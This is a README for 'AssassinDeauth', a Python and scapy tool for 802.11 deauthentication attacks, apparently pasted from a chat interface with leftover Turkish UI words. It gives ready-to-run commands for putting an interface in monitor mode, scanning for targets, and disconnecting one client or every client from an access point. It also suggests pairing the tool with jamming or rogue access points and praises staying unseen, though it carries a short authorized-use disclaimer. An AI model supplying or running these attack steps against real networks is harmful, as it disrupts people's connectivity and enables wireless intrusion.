📄 README.md
markdown
Kopyala
Düzenle
# 🛡️ AssassinDeauth – Shadow Wireless Disruption Tool

vbnet

  ▄████████  ▄██████▄   ▄█          ▄████████    ▄████████ 
 ███    ███ ███    ███ ███         ███    ███   ███    ███ 
 ███    █▀  ███    ███ ███         ███    █▀    ███    ███ 
 ███        ███    ███ ███        ▄███▄▄▄      ▄███▄▄▄▄██▀ 
 ███        ███    ███ ███       ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
 ███    █▄  ███    ███ ███         ███    █▄  ▀███████████ 
 ███    ███ ███    ███ ███▌    ▄   ███    ███   ███    ███ 
 ████████▀   ▀██████▀  █████▄▄██   ██████████   ███    ███ 
                        ▀                                
   ⚔ Built in the shadows by Miço | Deauth in silence ⚔
yaml


## ❗ Disclaimer

This tool is **strictly for educational and authorized penetration testing only**.

Performing deauthentication attacks on unauthorized networks is **illegal** and **unethical**.

---

## ⚙️ Features

- 🔧 Written in pure **Python3** using `scapy`
- 🧠 Command-line interface with `optparse`
- 🖥️ Metasploit-style logging with timestamps
- 🎭 Broadcast or single target **802.11 deauth** attack
- ⚔️ Assassin’s Creed & Anonymous-themed ASCII intro
- 🧵 Clean and minimal — easy to extend

---

## 📦 Dependencies

```bash
pip install scapy
sudo apt install aircrack-ng
🛰️ Usage
🎯 Targeted Deauth Attack
bash

sudo python3 assassindeauth.py -i wlan0mon -a 11:22:33:44:55:66 -t AA:BB:CC:DD:EE:FF -r 300
💣 Broadcast Deauth (All Clients)
bash
Kopyala
Düzenle
sudo python3 assassindeauth.py -i wlan0mon -a 11:22:33:44:55:66 -r 500
🛠️ Options
Option	Description
-i, --interface	Monitor mode wireless interface (e.g. wlan0mon)
-a, --ap	MAC address of the target Access Point (router)
-t, --target	MAC address of a specific client (optional)
-r, --rang	Number of deauth packets to send (default: 100)

🧙‍♂️ How to Prepare Your Interface
bash
Kopyala
Düzenle
sudo airmon-ng start wlan0      # Enables monitor mode (wlan0mon)
sudo airodump-ng wlan0mon       # Scan for clients/APs
🔥 Sample Output
less
Kopyala
Düzenle
[15:42:01] [INFO] Interface: wlan0mon
[15:42:01] [INFO] AP MAC: 11:22:33:44:55:66
[15:42:01] [INFO] Target MAC: AA:BB:CC:DD:EE:FF
[15:42:01] [INFO] Sending deauth to target AA:BB:CC:DD:EE:FF via AP 11:22:33:44:55:66
[15:42:12] [SUCCESS] Deauth packets sent.
💡 Tips
Use airodump-ng to discover MAC addresses of routers and clients.

Use ff:ff:ff:ff:ff:ff broadcast mode to kick all devices off.

Best results when paired with signal jamming or rogue AP attacks.

👁️ Final Words
"Nothing is true, everything is permitted."
– Ezio Auditore da Firenze

Crafted in the shadows, run in silence, and vanish before you're seen.
Use wisely, hacker...

less

**– gölgelerde yazılan, ışığı susturan bir araç…**
